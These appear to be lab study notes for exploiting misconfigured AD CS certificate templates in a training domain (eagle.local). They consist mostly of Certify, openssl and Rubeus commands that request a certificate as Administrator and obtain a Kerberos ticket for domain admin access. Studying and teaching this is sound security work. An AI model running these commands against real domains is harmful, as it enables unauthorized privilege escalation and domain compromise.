	Description:
	
		Misconfigs in AD CS

	Usage: 

		Using Certify.exe to enum the domain: https://github.com/GhostPack/Certify
		
			.\Certify.exe find /vulnerable
			.\Certify.exe request /ca:PKI.eagle.local\eagle-PKI-CA /template:UserCert /altname:Administrator
			
		Once the attack finishes, we will obtain a certificate successfully. The command generates a `PEM` certificate and displays it as base64. We need to convert the `PEM` certificate to the [PFX](https://learn.microsoft.com/en-us/windows-hardware/drivers/install/personal-information-exchange---pfx--files) format by running the command mentioned in the output of Certify (when asked for the password, press `Enter` without providing one), however, to be on the safe side, let's first execute the below command to avoid bad formatting of the `PEM` file.

			sed -i 's/\s\s\+/\n/g' cert.pem
			openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

		Now that we have the certificate in a usable `PFX` format (which `Rubeus` supports), we can request a Kerberos TGT for the account `Administrator` and authenticate with the certificate:

			.\Rubeus.exe asktgt /domain:eagle.local /user:Administrator /certificate:cert.pfx /dc:dc1.eagle.local /pt

		`C$` share on DC1 to confirm perms
	